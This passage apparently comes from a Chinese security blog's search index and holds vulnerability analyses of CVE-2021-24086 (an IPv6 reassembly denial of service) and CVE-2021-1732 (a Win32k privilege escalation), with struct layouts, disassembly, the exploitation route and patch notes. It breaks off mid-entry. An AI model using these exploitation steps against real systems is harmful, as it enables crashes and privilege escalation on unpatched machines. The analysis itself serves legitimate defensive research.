参数的指针。如果 Storage 参数为 NULL，则返回值为 NULL。由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p><h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p><p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p><h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p><p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p><p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p><p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p><h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p><p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p><p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1732 Win10本地提权漏洞分析</title>
      <link href="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>内存破坏类内核提权漏洞一般是由C/C++的不安全操作引发，最常见的是Win32k组件中由于Callback机制导致的UAF漏洞。Windows操作系统设计初期，Win32k子系统是在用户态的，从Windows NT4开始，这部分代码移到了内核态，内核态增加了一个Win32k.sys模块，导致3个不安全的因素1.新的系统调用（1100+syscalls）2.用户模式回调（User-mode Callback）3.用户态和内核态之间的共享数据（Share data）。win32k是微软Windows子系统的图形GUI组件，该组件被用于Windows操作系统桌面的图形打印。由于win32k架构的原因，win32k的内核组件需要通过用户模式回调函数对用户模式下的代码进行调用，方便窗口的创建和管理。Win32k内核函数（如xxxCreateWindowEx）会通过用户进程PEBKernelCallBackTable生成回调函数（如xxxClientAllocWindowClassExtraBytes）,当用户模式回调函数完成后，会执行NtCallbackReturn将预期的返回参数传回内核，由于这些回调函数无状态特性，可以造成许多与对象锁定机制有关的漏洞。Win32k漏洞通常会利用tagWND数据结构的桌面对象，然后借助内核读写原语转化为纯数据攻击。</p><p>纯数据攻击（data-only attacks）过程通常分为两步：</p><ul><li><p>发现漏洞</p></li><li><p>使用对象字段（如tagWND.cbWndExtra）上特定OS API来利用现有的或新的读写原语。</p><p>tagWND数据结构有两个字段tagWnd.cbWndExtra和tagWND.ExtraBytes。当CreateWindowEx创建窗口时，可以注册窗口类时通过WNDCLASSEXA结构体中的cbWndExtra字段直接从内存中的tagWND对象之后请求额外的内存字节。额外的字节数是由cbWndExtra字段控制的，保存在ExtraBytes字段中。读写源于创建过程如下：</p><p>1.找到一个用于对内存中名为 WND0的tagWND对象执行写操作的漏洞（如UAF）。</p><p>2.在内存中先前破坏的WND0附近分配另一个名为WND1的tagWN对象</p><p>3.Wnd0.cbwndextra覆盖为一个非常大的值，如0xFFFFFFF</p><p>4.在WND0上调用一个API，比如SetWindowLongPtr,以越界写入WND1中的相关字段。</p></li></ul><p>多种利用Win32k内核的用户模式回调函数的漏洞例如CVE-2014-4113、CVE-2015-0057、CVE-2016-7255、CVE-2019-0808漏洞，都是利用Windows内核的tagWND读写功能来实现提权的。</p><p><strong>创建窗口相关的结构体和函数</strong></p><p>创建窗口函数：CreatWindowEx</p><p>用户态的窗口数据结构体：WNDCLASSEX</p><p>窗口类扩展内存大小：cbClsExtra</p><p>窗口扩展内存大小：cbWndExtra</p><p>窗口数据保存在内核态使用的结构体：tagWND和tagWNDK</p><p>用户态调用SetWindowLong可以设置窗口扩展内存数据</p><p>tagWnd:是Windows内核用来描述用户创建的窗口的内核数据结构，保存着窗口相关的所有信息。</p><p>tagBody:tagWND+0x28处的值，保存着tagWND的主体信息，由于Win32k TypeIsolation的作用，Windows内核将大部分User Object和Gdi Object,比如Window、Bitmap、Palette等对象头和对象主体之间分别从不同的位置开辟空间。</p><p><strong>tagWNDCLASSEXW</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tagWNDCLASSEXW</span> <span class="token punctuation">{</span>    UINT        cbSize<span class="token punctuation">;</span>        <span class="token comment">// 该结构体的大小，通过这个字段来区分桌面开发的新旧版本</span>    <span class="token comment">/* Win 3.x */</span>    UINT        style<span class="token punctuation">;</span>         <span class="token comment">// 窗口类的风格</span>    WNDPROC     lpfnWndProc<span class="token punctuation">;</span>   <span class="token comment">// 窗口的消息处理函数</span>    <span class="token keyword">int</span>         cbClsExtra<span class="token punctuation">;</span>    <span class="token comment">// 窗口类的扩展内存大小</span>    <span class="token keyword">int</span>         cbWndExtra<span class="token punctuation">;</span>    <span class="token comment">// 窗口的扩展内存大小</span>    HINSTANCE   hInstance<span class="token punctuation">;</span>     <span class="token comment">// 该窗口类的窗口消息处理函数所属的应用实例</span>    HICON       hIcon<span class="token punctuation">;</span>         <span class="token comment">// 该窗口类所用的图标</span>    HCURSOR     hCursor<span class="token punctuation">;</span>       <span class="token comment">// 该窗口类所用的光标</span>    HBRUSH      hbrBackground<span class="token punctuation">;</span> <span class="token comment">// 该窗口类所用的背景刷</span>    LPCWSTR     lpszMenuName<span class="token punctuation">;</span>  <span class="token comment">// 该窗口类所用的菜单资源</span>    LPCWSTR     lpszClassName<span class="token punctuation">;</span> <span class="token comment">// 该窗口类的名称</span>    <span class="token comment">/* Win 4.0 */</span>    HICON       hIconSm<span class="token punctuation">;</span>       <span class="token comment">// 该窗口类所用的小像标</span><span class="token punctuation">}</span> WNDCLASSEXW<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在用户态创建窗口时，需要调用RegisterClass注册窗口类，每个窗口类有自己的名字，调用CreateWindow创建窗口时传入类的名字，即可创建对应的窗口实例。<br>当cbWndExtra不为0时，系统会申请一段对应大小的空间，如果回调到用户态申请空间时，可能会触发漏洞。</p><p><strong>tagWND</strong></p><pre class="line-numbers language-none"><code class="language-none">ptagWND             //内核中调用ValidateHwnd传入用户态窗口句柄可返回此数据指针    0x18 unknown        0x80 kernel desktop heap base   //内核桌面堆基址    0x28 ptagWNDk      0xA8 spMenu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>tagWNDK</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagWNDK</span><span class="token punctuation">{</span>    ULONG64 hWnd<span class="token punctuation">;</span>               <span class="token comment">//+0x00</span>    ULONG64 OffsetToDesktopHeap<span class="token punctuation">;</span><span class="token comment">//+0x08 tagWNDK相对桌面堆基址偏移</span>    ULONG64 state<span class="token punctuation">;</span>              <span class="token comment">//+0x10</span>    DWORD dwExStyle<span class="token punctuation">;</span>            <span class="token comment">//+0x18</span>    DWORD dwStyle<span class="token punctuation">;</span>              <span class="token comment">//+0x1C</span>    BYTE gap<span class="token punctuation">[</span><span class="token number">0x38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    DWORD rectBar_Left<span class="token punctuation">;</span>         <span class="token comment">//0x58</span>    DWORD rectBar_Top<span class="token punctuation">;</span>          <span class="token comment">//0x5C</span>    BYTE gap1<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG64 cbWndExtra<span class="token punctuation">;</span>         <span class="token comment">//+0xC8 窗口扩展内存的大小</span>    BYTE gap2<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    DWORD dwExtraFlag<span class="token punctuation">;</span>          <span class="token comment">//+0xE8  决定SetWindowLong寻址模式</span>    BYTE gap3<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//+0xEC</span>    DWORD cbWndServerExtra<span class="token punctuation">;</span>     <span class="token comment">//+0xFC</span>    BYTE gap5<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG64 pExtraBytes<span class="token punctuation">;</span>    <span class="token comment">//+0x128 模式1：内核偏移量 模式2：用户态指针</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当WNDCLASSEXW 中的cbWndExtra值不为0时，创建窗口时内核会回调到用户态函数USER32!_xxxClientAllocWindowClassExtraBytes申请一块cbWndExtra大小的内存区域，并且将返回地址保存在tagWNDK结构体的pExtraBytes变量中。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2021-1732是Windows Win32k组件驱动模块Win32kfull.sys(Windows内核用来实现图形化系统的核心驱动程序)的LPE漏洞，由于创建窗口时调用win32kfull!xxxCreateWindowEx过程中会进行用户模式回调（KeUserModeCallback）,从而给了用户态进程利用的机会。该漏洞由安恒信息在2020年12月捕获，在2021年2月公开披露，相关样本在蔓玲花（BITTER）APT组织在某次被披露的攻击行动中使用，可以在本地将普通用户进程权限提升为system权限。</p><p>漏洞类型：Type Confusion(类型混淆漏洞)</p><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Windows Server, version 20H2 (Server Core Installation)Windows 10 Version 20H2 for ARM64-based SystemsWindows 10 Version 20H2 for 32-bit SystemsWindows 10 Version 20H2 for x64-based SystemsWindows Server, version 2004 (Server Core installation)Windows 10 Version 2004 for x64-based SystemsWindows 10 Version 2004 for ARM64-based SystemsWindows 10 Version 2004 for 32-bit SystemsWindows Server, version 1909 (Server Core installation)Windows 10 Version 1909 for ARM64-based SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for 32-bit SystemsWindows Server 2019 (Server Core installation)Windows Server 2019Windows 10 Version 1809 for ARM64-based SystemsWindows 10 Version 1809 for x64-based SystemsWindows 10 Version 1809 for 32-bit SystemsWindows 10 Version 1803 for ARM64-based SystemsWindows 10 Version 1803 for x64-based Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>用户态进程在调用CreateWindowEx创建的带有扩展内存的windows窗口时，内核态图形驱动win32full.sys模块的xxxCreateWindowEx函数会通过nt!KeUerModeCallback回调机制调用用户态函数user32!_xxxClientAllocWindowClassExtraBytes,向内核返回用户态创建的窗口扩展内存。该返回值的解释由窗口对应tagWND结构体的dwExtarFlag字段规定，如果dwExtraFlag包含0x800属性，返回值被视作相对内核桌面堆起始地址的偏移。攻击者可以hook user32!xxxClientAllocWindowClassExtraBytes函数，通过一些手段使得dwExtarFlag包含0x800属性，然后直接调用dtdll!NtCallbackReturn向内核返回一个任意值。回调结束后，dwExtraFlag不会被清除，未经效验的返回值直接被用于堆内存寻址（桌面堆起始地址+返回值），引发内存越界访问，攻击者通过构造和api封装，获得内存读写能力，最后复制system进程的token到进程完成提权。</p><p>正常逻辑：<br>1.CreateWindowsEx会调用内核函数xxxCreateWindowEx来实现窗口创建。</p><p>2.xxxCreateWindowEx内部会调用xxxClientAllocWindowClassExtraBytes来创建额外的空间，之后将返回的地址保存在tagBody+0x128处</p><p>3.xxxClientAllowWindowClassExtraBytes会切换到用户带执行开辟空间的动作，空间申请完成后，调用NtCallbackReturn返回到内核执行点继续执行。</p><p>漏洞逻辑：<br>漏洞发生在第二步，返回用户态执行开辟空间的代码中，若此时调用NtUserConsoleControl</p><p>1.NtUserConsoleControl内部会修改tagBody+0xE8处的Flag，通过逻辑或其他方式添加0x800标志，*(tagBody+0xE8) | =0x800</p><p>2.0x800这个标志tagBody+0x128处保存的值是否一个相对偏移，若是，则值为相对DesktopHeap基址的偏移，若不是，则保存用户态的地址。</p><p>3.标志位的修改，导致后续对tagBody+0x128处的值被作为偏移来使用，最终在xxxDestroyWindow发生使用，从而产生崩溃。</p><h3 id="win32kfull-xxxCreateWindowEx"><a href="#win32kfull-xxxCreateWindowEx" class="headerlink" title="win32kfull!xxxCreateWindowEx"></a>win32kfull!xxxCreateWindowEx</h3><p><strong>传入tagWND -&gt; cbwndExtra 到 xxxClientAllowWindowClassExtraBytes,在xxxClientAllowWindowClassExtraBytes执行后返回pExtraBytes</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094750991.png"></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094809198.png"></p><p>判断tagWND -&gt; cbWndExtra不为0</p><pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F81                 call    ??9?$RedirectedFieldcbwndExtra@H@tagWND@@QEBAEAEBH@Z ; tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!=(int const &amp;).text:00000001C0079F86                 test    al, al       ;判断   .text:00000001C0079F88                 jz      short loc_1C0079FD4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>传入参数cbWndExtra后调用xxxClientAllocWindowClassExtraBytes</p><pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F8A                 mov     rax, [r15+28h]  ; 进入ptagWNDK.text:00000001C0079F8E                 mov     ecx, [rax+0C8h] ; 传参cbWndExtra.text:00000001C0079F94                 call    xxxClientAllocWindowClassExtraBytes;调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将xxxClientAllocWindowClassExtraBytes返回值传到tagWND -&gt; pExtraBytes</p><pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F99                 mov     rcx, rax  ; 返回值到rcx.text:00000001C0079F9C                 mov     rax, [r15+28h] ; 进入tagWNDK.text:00000001C0079FA0                 mov     [rax+128h], rcx ; 将返回值赋值到tagWNDK+0x128处<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="win32kfull-xxxClientAllocWindowClassExtraBytes"><a href="#win32kfull-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="win32kfull!xxxClientAllocWindowClassExtraBytes"></a>win32kfull!xxxClientAllocWindowClassExtraBytes</h3><p><strong>win32kfull!xxxCreateWindowEx载入了一个cbwndExtra，然后回调用户层user32!xxxClientAllowWindowClassExtraBytes返回了pExtraBytes然后传回win32kfull!xxxCreateWindowEx,用于赋值pExtraBytes</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094902175.png"></p><p>KeUserModeCallback使用编号123回调且传入参数cbwndExtra到用户层user32.dll中的KernelCallbackTable表中user32!xxxClientAllocWindowClassExtraBytes函数,从user32!xxxClientAllocWindowClassExtraBytes调用NtCallbackReturn，返回数据有返回数据outputbuffer和返回数据长度outputlength,outputlength长度是0x18,MmUserProbeAddress会判断返回的内存outputbuffer是否越界，MmUserProbeAddress == 0xfff0000表示用户层边界，v5 = PsGetCurrentProcessWow64Process();返回的指针第一个只想用户层分配内存的地址，使用ProbeForRead判断用户层返回的内存是否是Ring3内存。v4是将要载入的pExtraBytes的内存地址。</p><h3 id="user32-xxxClientAllocWindowClassExtraBytes"><a href="#user32-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="user32!_xxxClientAllocWindowClassExtraBytes"></a>user32!_xxxClientAllocWindowClassExtraBytes</h3><p><strong>用户层申请一个堆地址后将地址回调到内核层执行</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094918422.png"></p><p>RtlAllocateHeap分配了一个内存并返回这个内存的地址。NtCallbackReturn传输了长度0x18的数据到内核层，win32kfull!xxxClientAllocWindowClassExtraBytes作为参数继续运行，长度为0x18数据的第一个8字节长度数据是分配后的地址。</p><h3 id="win32kfull-NtUserConsoleControl"><a href="#win32kfull-NtUserConsoleControl" class="headerlink" title="win32kfull!NtUserConsoleControl"></a>win32kfull!NtUserConsoleControl</h3><p><strong>实质作用是调用xxxConsoleControl,将结果保存在Process_Info中，当ControlCode==6时，会来到xxxConsoleControl</strong></p><p><strong>指定窗口hwnd的dwExtraFlag包含0x800属性</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094948239.png"></p><p>参数1：功能序号，小于等于6</p><p>参数2：输入信息，是hook调用NtUserConsoleControl需要获取的HWND</p><p>参数3：输入信息长度，需要小于等于0x18</p><h3 id="win32kfull-xxxConsoleControl"><a href="#win32kfull-xxxConsoleControl" class="headerlink" title="win32kfull!xxxConsoleControl"></a>win32kfull!xxxConsoleControl</h3><p><strong>当flag为0x800直接调用offset寻址，当flag不是0x800会生成一个新内存，把这个内存地址设置为offset再寻址</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095011415.png"></p><p>判断tagWND -&gt; dwExtraFlag是否包含0x800属性。包含0x800时，会重新分配桌面堆，并将偏移0x128保存的分配地址内存pExtrabytes变成了内核桌面地址+offset寻址；不包含0x800就会重新分配内存并设置偏移0x128为offset寻址，将新生成的pExtrabytes赋值cbWndExtra大小到offset寻址内存处。(这些会直接影响SetWindowLong系列函数对窗口的设置)</p><p><strong>只要调用了win32kfull!NtConsoleControl就能将dwExtraFlag添加0x800属性。</strong></p><h3 id="user32-SetWindowLong"><a href="#user32-SetWindowLong" class="headerlink" title="user32!SetWindowLong"></a>user32!SetWindowLong</h3><p><strong>setWindowLong只需要传入3个参数</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095024069.png"></p><h3 id="win32kfull-NtSetWindowLong"><a href="#win32kfull-NtSetWindowLong" class="headerlink" title="win32kfull!NtSetWindowLong"></a>win32kfull!NtSetWindowLong</h3><p>*<em>在调用NTSetWindowLong函数时，会调用User32!SetWindowLong，然后传递参数到内核层中的Win32kfull!NtSetWindowLong中调用，，当flag=0x800时，将参数3写入参数2 + <em>（tagWND+0xFC)+内核桌面堆地址+pExtraBytes）指向的地址，进而导致越界写入</em></em></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095053503.png"></p><p>user32!SetWindowLong传到内核层的参数，a4固定为1，获取到tagWND句柄，将调用user32!SetWindowLong传入的参数加载到xxxSetWindowLong中继续执行。</p><h3 id="win32kfull-xxxSetWindowLong"><a href="#win32kfull-xxxSetWindowLong" class="headerlink" title="win32kfull!xxxSetWindowLong"></a>win32kfull!xxxSetWindowLong</h3><p>参数a1是hWnd</p><pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall xxxSetWindowLong(struct tagWND *a1, int a2, unsigned int a3, __int64 a4, int a5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>v13指向tagWND中的ptagWNDK</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095109445.png"></p><p>设置新指针v14指向v13</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095122630.png"></p><p>v15是tagWNDK+0xFC,传入的nIndex+4必须小于tagWND+0xFC指向的地址内容</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095140302.png"></p><p>指针v18是传入的参数2（v15指向的ptagWNDK+0xFC）之后判断tagWNDK -&gt; flag是有0x800属性，v20指向*(pExtraBytes+载入的参数2+内核参数地址)，offset可以使用SetWindowLong自定义。</p><p><strong>标记了0x800，采用桌面堆+偏移的方式写入NewLong；没有标记0x800，直接在tag-&gt;WndExtraBytes写入NewLong</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095153990.png"></p><h3 id="win32kfull-xxxSetWindowLongPtr"><a href="#win32kfull-xxxSetWindowLongPtr" class="headerlink" title="win32kfull!xxxSetWindowLongPtr"></a>win32kfull!xxxSetWindowLongPtr</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810113654553.png"></p><p>当nIndex = 0, tag-&gt;ExtraBytes写入NewLong;</p><p>当nIndex&gt;0且nIndex&lt;0xfffffffffffffee0-8,设置tagWnd-&gt;ExtraBytes</p><p>当nIndex&lt;0时调用xxxSetWindowData</p><p>SetWindowLongPtr调用xxxSetWindowData执行特定的堆spmenu赋值功能。xxxSetWindowLongPtr需要满足以下条件跳转到xxxSetWindowData</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095208918.png"></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095221101.png"></p><h3 id="win32kfull-xxxSetWindowData"><a href="#win32kfull-xxxSetWindowData" class="headerlink" title="win32kfull!xxxSetWindowData"></a>win32kfull!xxxSetWindowData</h3><p><strong>tagWNDK-&gt;style包含WS_CHILD,tagWND-&gt;spMenu=NewLong</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810140319032.png"></p><p>tagWNDK-&gt;style需要包含WS_CHILD</p><p>将参数dwNewLong数据覆盖到(tagWND-&gt;spmenu)</p><h3 id="CreateWindowEx生成HWND"><a href="#CreateWindowEx生成HWND" class="headerlink" title="CreateWindowEx生成HWND"></a>CreateWindowEx生成HWND</h3><p>CreateWindowEx调用内核xxxCreateWindowEx函数</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810141650800.png"></p><p>HMAllocObject中的CurThread_1表示当前线程信息，rdesk是ptiCurrent-&gt;rdesk.</p><p>Type为是windows，WndObject是tagWND</p><p>Typew等于1时，采用桌面堆进行分配</p><h3 id="win32kfull-CreateMenu"><a href="#win32kfull-CreateMenu" class="headerlink" title="win32kfull!CreateMenu"></a>win32kfull!CreateMenu</h3><p><strong>调用流程：CreateMenu -&gt; NtUserCallNoParam -&gt; apfnSimpleCall -&gt; InternalCreateMenu</strong></p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810150749209.png"></p><h3 id="win32kfull-InternalCreateMenu"><a href="#win32kfull-InternalCreateMenu" class="headerlink" title="win32kfull!InternalCreateMenu"></a>win32kfull!InternalCreateMenu</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151048062.png"></p><h3 id="win32kfull-InitLookAsideRef"><a href="#win32kfull-InitLookAsideRef" class="headerlink" title="win32kfull!InitLookAsideRef"></a>win32kfull!InitLookAsideRef</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151401258.png"></p><h3 id="user32-GetMenuBarInfo"><a href="#user32-GetMenuBarInfo" class="headerlink" 